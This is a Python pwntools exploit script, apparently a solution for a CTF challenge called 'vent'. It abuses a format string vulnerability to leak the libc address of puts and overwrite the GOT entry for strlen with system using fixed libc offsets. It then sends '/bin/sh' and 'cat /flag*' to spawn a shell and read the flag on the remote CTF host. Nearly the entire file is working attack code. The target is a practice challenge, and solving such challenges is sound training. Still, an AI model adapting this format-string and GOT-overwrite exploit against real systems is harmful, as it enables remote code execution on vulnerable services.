#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vent'
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'vent.squ1rrel-ctf-codelab.kctf.cloud', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec vent
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

def exploit():
    global io
    io = initialize()

    # payload = fmtstr_payload(8, {})
    payload = b"%9$s" + b'ABCD' + p64(elf.got['puts']) 
    io.sendlineafter(b'?', payload)

    io.recvuntil(b'said:')
    leak = u64(io.recvuntil(b'ABCD', drop=True).replace(b'\n', b'').ljust(8, b'\x00'))
    libc = leak - 0x084420
    system = libc + 0x052290

    payload = fmtstr_payload(8, {elf.got['strlen']: system})
    io.sendlineafter(b'?', payload)

    sleep(0.2)
    io.sendline(b'/bin/sh')
    io.sendline(b'cat /flag*')

    log.success('libc base: %#x', libc)
    io.interactive()
    
if __name__ == '__main__':
    exploit()